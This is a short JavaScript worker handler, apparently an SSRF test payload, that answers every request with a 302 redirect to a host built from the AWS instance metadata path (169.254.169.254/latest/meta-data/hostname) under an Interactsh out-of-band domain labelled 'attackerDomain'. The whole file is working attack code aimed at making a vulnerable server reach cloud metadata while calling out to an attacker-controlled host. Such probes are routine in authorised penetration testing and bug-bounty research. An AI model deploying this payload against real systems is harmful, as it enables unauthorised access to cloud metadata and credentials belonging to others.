export default {
  async fetch(request) {
    // Step 1: Redirect to AWS metadata path encoded in the DNS subdomain
    const awsPath = "169-254-169-254-latest-meta-data-hostname"; // DNS-safe format
    const attackerDomain = "bjgibppjensgmxvguqwdo8l6ka1vo9c8n.oast.fun"; // Your Interactsh domain
    return Response.redirect(`http://${awsPath}.${attackerDomain}`, 302);
  }
};
